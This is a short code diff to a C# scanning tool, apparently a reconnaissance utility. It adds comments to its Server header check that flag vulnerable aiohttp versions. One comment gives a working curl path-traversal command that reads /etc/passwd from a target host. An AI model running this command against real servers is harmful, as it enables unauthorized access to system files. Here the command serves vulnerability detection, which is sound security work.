@@ -49,6 +49,10 @@ namespace Reecon
                         if (headerName == "Server")
                         {
                             returnInfo += "- Server: " + headerValue + Environment.NewLine;
+                            // https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=34561
+                            // Aiohttp versions from and including 1.0.5 and before 3.9.2
+                            // Eg: curl --path-as-is host.com/data/../../../../../../../../../../../etc/passwd
+                            // - Server: Python/3.9 aiohttp/3.9.1
                         }
                         else if (headerName == "WWW-Authenticate")
                         {
